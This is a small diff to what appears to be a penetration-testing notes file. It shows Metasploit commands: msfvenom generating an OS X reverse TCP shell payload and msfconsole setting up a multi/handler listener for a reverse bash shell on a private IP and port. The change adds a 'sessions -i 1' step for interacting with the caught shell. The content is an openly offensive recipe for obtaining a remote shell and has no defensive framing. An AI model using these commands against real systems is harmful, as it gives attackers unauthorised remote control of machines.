@@ -19,8 +19,15 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.34 LPORT=6680 -f raw
 msfconsole
 use multi/handler
 set PAYLOAD cmd/unix/reverse_bash
-set LHOST 192.168.0.34
+set LHOST 192.168.0.34   
 set LPORT 6680
 exploit -j -z
 
 ```
+
+
+```
+sessions -i 1
+```
+
+
